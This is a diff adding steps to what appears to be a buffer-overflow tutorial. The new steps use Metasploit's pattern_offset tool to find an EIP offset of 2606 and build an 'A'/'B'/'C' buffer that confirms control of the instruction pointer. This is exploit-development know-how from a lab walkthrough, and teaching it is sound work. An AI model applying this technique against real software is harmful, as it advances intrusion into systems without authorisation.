@@ -68,3 +68,15 @@ After running this, note the EIP hex bytes, in this cas 39 69 44 38, then do:
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438
 ```
+
+Running this will output put something like this:
+
+```
+[*] Exact match at offset 2606
+```
+
+Change the script made above, to the below.  This will write tons of A's up to the point of the EIP. Then it will write 4 B's in to the register, and the C's will fill up memory after this point. This will confirm that we have full control over the EIP and what goes inside it.
+
+```
+buffer = "A" * 2606 + "B" * 4 + "C" * 90
+```
